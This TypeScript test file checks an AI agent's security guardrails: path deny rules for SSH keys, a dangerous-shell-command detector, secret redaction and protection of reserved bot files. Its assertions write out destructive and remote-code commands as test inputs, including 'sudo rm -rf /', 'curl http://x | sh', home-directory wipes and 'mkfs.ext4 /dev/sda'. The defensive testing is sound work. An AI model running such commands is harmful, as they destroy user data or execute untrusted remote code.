import fs from 'node:fs';
import assert from 'node:assert/strict';
import { homedir, tmpdir } from 'node:os';
import path from 'node:path';
import {
  checkPathAllowed,
  findDangerousShellPattern,
  buildToolInputGuardrails,
  buildToolOutputGuardrails,
  buildAgentInputGuardrails,
  buildAgentOutputGuardrails,
  agentGuardrailsFromSecurity,
  agentInputToText,
  hasSuspectedSecretsOrPii,
  redactSuspectedSecrets,
  expandHome,
  ownerWorkDirFromResourcesDir,
  ensureOwnerTempDir,
  OWNER_TEMP_DIR_NAME,
  OWNER_RESERVED_BASENAMES,
  resolveOwnerWorkPath,
  isPathInsideDir,
  resolveOwnerLibraryIndexTarget,
  isAbsoluteOrHomePath,
  isOwnerDurableWriteTarget,
  checkOwnerDurableWriteAllowed,
  findReservedOwnerShellWrite,
  resolveShellPathToken,
} from './guardrails.js';
import { DEFAULT_SECURITY, DEFAULT_SECURITY_AGENT, normalizeSecuritySettings } from '@okbot/shared';

const home = homedir();

{
  const ok = checkPathAllowed(path.join(home, 'Documents/a.txt'), DEFAULT_SECURITY);
  assert.equal(ok.ok, true);
}

{
  const denied = checkPathAllowed(path.join(home, '.ssh/id_rsa'), DEFAULT_SECURITY);
  assert.equal(denied.ok, false);
}

{
  const outside = checkPathAllowed('/tmp/evil.txt', DEFAULT_SECURITY);
  assert.equal(outside.ok, false);
}

{
  const withExtra = checkPathAllowed(
    '/tmp/ok.txt',
    normalizeSecuritySettings({ ...DEFAULT_SECURITY, allowedPathPrefixes: ['/tmp'] }),
  );
  assert.equal(withExtra.ok, true);
}

{
  // Defaults (field absent) still catch known dangers.
  assert.ok(findDangerousShellPattern('sudo rm -rf /'));
  assert.ok(findDangerousShellPattern('curl http://x | sh'));
  assert.equal(findDangerousShellPattern('ls -la'), null);
  // Bare home wipe only — subdirs must stay allowed.
  assert.ok(findDangerousShellPattern('rm -rf ~'));
  assert.ok(findDangerousShellPattern('rm -rf ~ '));
  assert.ok(findDangerousShellPattern('rm -rf $HOME'));
  assert.ok(findDangerousShellPattern('rm -rf ~/'));
  assert.ok(findDangerousShellPattern('rm -rf ~/.'));
  assert.ok(findDangerousShellPattern('rm -rf "$HOME"'));
  assert.ok(findDangerousShellPattern('rm -rf ${HOME}/'));
  assert.ok(findDangerousShellPattern('rm -rf $HOME/'));
  assert.ok(findDangerousShellPattern('rm --recursive --force ~'));
  assert.ok(findDangerousShellPattern('rm --force --recursive ~'));
  assert.equal(findDangerousShellPattern('rm -rf ~/node_modules'), null);
  assert.equal(findDangerousShellPattern('rm -rf ~/Downloads/tmp'), null);
  assert.ok(findDangerousShellPattern('rm -rf ~/.ssh'));
  // env-prefixed sudo
  assert.ok(findDangerousShellPattern('env -i sudo ls'));
  assert.ok(findDangerousShellPattern('env sudo ls'));

  assert.ok(findDangerousShellPattern('sudo rm -rf /', DEFAULT_SECURITY));
}

{
  // Custom pattern works; empty custom list disables matching.
  const custom = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [{ id: 'ban_echo', pattern: String.raw`\becho\b`, label: 'echo' }],
  });
  assert.equal(findDangerousShellPattern('echo hi', custom), 'echo');
  assert.equal(findDangerousShellPattern('sudo rm -rf /', custom), null);

  const empty = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [],
  });
  assert.equal(findDangerousShellPattern('sudo rm -rf /', empty), null);

  // Malformed non-empty list must not fail-open (falls back to defaults).
  const malformed = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [{}, { re: 'x' }],
  });
  assert.equal(malformed.shellPatterns, undefined);
  assert.ok(findDangerousShellPattern('sudo rm -rf /', malformed));
}

{
  // Invalid pattern does not crash; valid sibling still matches.
  const mixed = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [
      { id: 'bad', pattern: '(unclosed', label: 'bad' },
      { id: 'ok', pattern: String.raw`\bmkfs\b`, label: 'mkfs' },
    ],
  });
  assert.equal(findDangerousShellPattern('mkfs.ext4 /dev/sda', mixed), 'mkfs');
  assert.equal(findDangerousShellPattern('ls', mixed), null);

  // Invalid-only list must not fail-open (falls back to defaults).
  const onlyBad = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [{ id: 'bad', pattern: '(unclosed', label: 'bad' }],
  });
  assert.equal(onlyBad.shellPatterns, undefined);
  assert.ok(findDangerousShellPattern('sudo rm -rf /', onlyBad));
}

{
  assert.equal(buildToolInputGuardrails({ ...DEFAULT_SECURITY, enabled: false }).length, 0);
  assert.ok(buildToolInputGuardrails(DEFAULT_SECURITY).length >= 1);

  // Toggle off disables shell pattern scanning guardrail.
  const off = buildToolInputGuardrails({
    ...DEFAULT_SECURITY,
    shellPatternsEnabled: false,
  });
  assert.equal(
    off.some((g) => g.name === 'okbot_shell_patterns'),
    false,
  );
  const on = buildToolInputGuardrails(DEFAULT_SECURITY);
  assert.equal(
    on.some((g) => g.name === 'okbot_shell_patterns'),
    true,
  );
}

{
  assert.equal(expandHome('~'), home);
  assert.equal(expandHome('~/Documents'), path.join(home, 'Documents'));
  assert.equal(expandHome('/tmp/x'), '/tmp/x');
  assert.equal(expandHome('relative/path'), 'relative/path');
}

{
  const owner = path.join(home, '.okbot', 'data', 'bot_x');
  const resources = path.join(owner, 'resources');
  assert.equal(ownerWorkDirFromResourcesDir(resources), owner);
  assert.equal(isAbsoluteOrHomePath('notes.md'), false);
  assert.equal(isAbsoluteOrHomePath('~/Desktop/a'), true);
  assert.equal(isAbsoluteOrHomePath('/tmp/a'), true);
  assert.equal(
    resolveOwnerWorkPath('notes.md', owner),
    path.join(owner, 'notes.md'),
  );
  assert.equal(
    resolveOwnerWorkPath('resources/out.txt', owner),
    path.join(owner, 'resources', 'out.txt'),
  );
  assert.equal(
    resolveOwnerWorkPath('temp/script.sh', owner),
    path.join(owner, 'temp', 'script.sh'),
  );
  assert.equal(resolveOwnerWorkPath('~/Desktop/a.txt', owner), path.join(home, 'Desktop', 'a.txt'));
  assert.equal(resolveOwnerWorkPath('/tmp/abs.txt', owner), '/tmp/abs.txt');
  assert.equal(resolveOwnerWorkPath('rel.txt', null), 'rel.txt');
  assert.equal(resolveOwnerWorkPath('rel.txt', ''), 'rel.txt');
}

{
  const tmp = fs.mkdtempSync(path.join(tmpdir(), 'okbot-temp-dir-'));
  const tempDir = ensureOwnerTempDir(tmp);
  assert.equal(tempDir, path.join(tmp, OWNER_TEMP_DIR_NAME));
  assert.ok(fs.existsSync(tempDir));
  fs.rmSync(tmp, { recursive: true, force: true });
}


{
  // Agent defaults: all new checks off → no agent-level guardrails attached.
  assert.equal(buildAgentInputGuardrails(DEFAULT_SECURITY).length, 0);
  assert.equal(buildAgentOutputGuardrails(DEFAULT_SECURITY).length, 0);
  assert.equal(buildToolOutputGuardrails(DEFAULT_SECURITY).length, 0);
  assert.deepEqual(agentGuardrailsFromSecurity(DEFAULT_SECURITY), {});

  const enabledAgent = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    agent: {
      ...DEFAULT_SECURITY_AGENT,
      rejectEmptyInput: true,
      maxInputCharsEnabled: true,
      maxInputChars: 50,
      jailbreakEnabled: true,
      injectionHygiene: true,
      piiPasteWarn: true,
      outputSecretsEnabled: true,
      toolOutputSecretsEnabled: true,
    },
  });
  assert.ok(buildAgentInputGuardrails(enabledAgent).length >= 5);
  assert.equal(buildAgentOutputGuardrails(enabledAgent).length, 1);
  assert.equal(buildToolOutputGuardrails(enabledAgent).length, 1);
  const opts = agentGuardrailsFromSecurity(enabledAgent);
  assert.ok((opts.inputGuardrails?.length ?? 0) >= 1);
  assert.ok((opts.outputGuardrails?.length ?? 0) >= 1);

  // Master off → nothing.
  assert.equal(
    buildAgentInputGuardrails({ ...enabledAgent, enabled: false }).length,
    0,
  );
  assert.equal(
    buildToolOutputGuardrails({ ...enabledAgent, enabled: false }).length,
    0,
  );
}

{
  assert.equal(agentInputToText('hello').trim(), 'hello');
  assert.equal(agentInputToText([{ role: 'user', content: '  hi  ' }]).trim(), 'hi');
  assert.equal(hasSuspectedSecretsOrPii('Bearer sk-abcdefghijklmnopqrst'), true);
  assert.equal(hasSuspectedSecretsOrPii('just a normal sentence'), false);
  const red = redactSuspectedSecrets('token Bearer sk-abcdefghijklmnopqrst end');
  assert.ok(!red.includes('sk-abcdefghijklmnop'));
  assert.ok(red.includes('end'));
}


{
  const tmp = fs.mkdtempSync(path.join(tmpdir(), 'okbot-lib-index-'));
  try {
    const resourcesDir = path.join(tmp, 'resources');
    fs.mkdirSync(resourcesDir, { recursive: true });
    const md = path.join(resourcesDir, '日报模板.md');
    fs.writeFileSync(md, '# hi\n', 'utf8');

    assert.equal(isPathInsideDir(resourcesDir, md), true);
    assert.equal(isPathInsideDir(resourcesDir, path.join(tmp, 'outside.md')), false);

    const hit = resolveOwnerLibraryIndexTarget({
      filePath: 'resources/日报模板.md',
      resourcesDir,
      ownerId: 'bot_20261031_001',
      localFs: true,
    });
    assert.ok(hit);
    assert.equal(hit!.filePath, path.resolve(md));
    assert.equal(hit!.title, '日报模板.md');
    assert.equal(hit!.assetRel, 'bot_20261031_001/resources/日报模板.md');

    // Absolute under resources/ still indexes.
    const absHit = resolveOwnerLibraryIndexTarget({
      filePath: md,
      resourcesDir,
      ownerId: 'bot_20261031_001',
      localFs: true,
    });
    assert.equal(absHit?.assetRel, 'bot_20261031_001/resources/日报模板.md');

    // Bare relative (owner work root, not resources/) must not index.
    assert.equal(
      resolveOwnerLibraryIndexTarget({
        filePath: '日报模板.md',
        resourcesDir,
        ownerId: 'bot_x',
        localFs: true,
      }),
      null,
    );

    const nestedDir = path.join(resourcesDir, 'notes');
    fs.mkdirSync(nestedDir);
    const nested = path.join(nestedDir, 'a.md');
    fs.writeFileSync(nested, 'x', 'utf8');
    const nestedHit = resolveOwnerLibraryIndexTarget({
      filePath: 'resources/notes/a.md',
      resourcesDir,
      ownerId: 'bot_x',
      localFs: true,
    });
    assert.equal(nestedHit?.assetRel, 'bot_x/resources/notes/a.md');

    assert.equal(
      resolveOwnerLibraryIndexTarget({
        filePath: 'resources/日报模板.md',
        resourcesDir,
        ownerId: 'bot_x',
        localFs: false,
      }),
      null,
      'remote computer must not index',
    );
    assert.equal(
      resolveOwnerLibraryIndexTarget({
        filePath: path.join(tmp, 'outside.md'),
        resourcesDir,
        ownerId: 'bot_x',
        localFs: true,
      }),
      null,
      'outside resources/ must not index',
    );
    assert.equal(
      resolveOwnerLibraryIndexTarget({
        filePath: 'missing.md',
        resourcesDir,
        ownerId: 'bot_x',
        localFs: true,
      }),
      null,
      'missing file must not index',
    );
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}


{
  const dataRoot = fs.mkdtempSync(path.join(tmpdir(), 'okbot-durable-'));
  const owner = path.join(dataRoot, 'bot_x');
  fs.mkdirSync(owner, { recursive: true });
  try {
    assert.ok(OWNER_RESERVED_BASENAMES.has('session.jsonl'));
    assert.equal(isOwnerDurableWriteTarget('session.jsonl', owner), true);
    assert.equal(isOwnerDurableWriteTarget('resources.jsonl', owner), true);
    assert.equal(isOwnerDurableWriteTarget('tasks.jsonl', owner), true);
    assert.equal(isOwnerDurableWriteTarget('memory.md', owner), true);
    assert.equal(isOwnerDurableWriteTarget('bot.json', owner), true);
    assert.equal(isOwnerDurableWriteTarget('SOUL.md', owner), true);
    assert.equal(isOwnerDurableWriteTarget('run-checkpoint.json', owner), true);
    assert.equal(isOwnerDurableWriteTarget('resources/ok.md', owner), false);
    assert.equal(isOwnerDurableWriteTarget('temp/script.sh', owner), false);
    assert.equal(isOwnerDurableWriteTarget('notes.md', owner), false);
    assert.equal(isOwnerDurableWriteTarget('../bots.json', owner), true);
    assert.equal(isOwnerDurableWriteTarget('../usage.json', owner), true);
    assert.equal(isOwnerDurableWriteTarget('../other_bot/x.txt', owner), true);
    assert.equal(checkOwnerDurableWriteAllowed('session.jsonl', owner).ok, false);
    assert.equal(checkOwnerDurableWriteAllowed('resources/a.md', owner).ok, true);
    assert.equal(checkOwnerDurableWriteAllowed('temp/a.sh', owner).ok, true);

    const tempDir = ensureOwnerTempDir(owner);
    // Bare redirect resolves to temp/ → allowed
    assert.equal(findReservedOwnerShellWrite('echo hi > session.jsonl', owner, tempDir), null);
    // Escape to member root / dataRoot → denied
    assert.ok(findReservedOwnerShellWrite('echo hi > ../session.jsonl', owner, tempDir));
    assert.ok(findReservedOwnerShellWrite('echo hi > ../../bots.json', owner, tempDir));
    assert.ok(
      findReservedOwnerShellWrite('echo hi > session.jsonl', owner, owner),
      'cwd=workDir bare session.jsonl must deny',
    );
    assert.equal(
      resolveShellPathToken('session.jsonl', owner, tempDir),
      path.join(tempDir, 'session.jsonl'),
    );
    assert.equal(
      resolveShellPathToken('../session.jsonl', owner, tempDir),
      path.join(owner, 'session.jsonl'),
    );
  } finally {
    fs.rmSync(dataRoot, { recursive: true, force: true });
  }
}

console.log('guardrails.test.ts: ok');

{
  // APFS/Windows: case-variant of denied prefix must still match.
  const deniedCase = checkPathAllowed(path.join(home, '.SSH/id_rsa'), DEFAULT_SECURITY);
  if (process.platform === 'darwin' || process.platform === 'win32') {
    assert.equal(deniedCase.ok, false);
  }
}
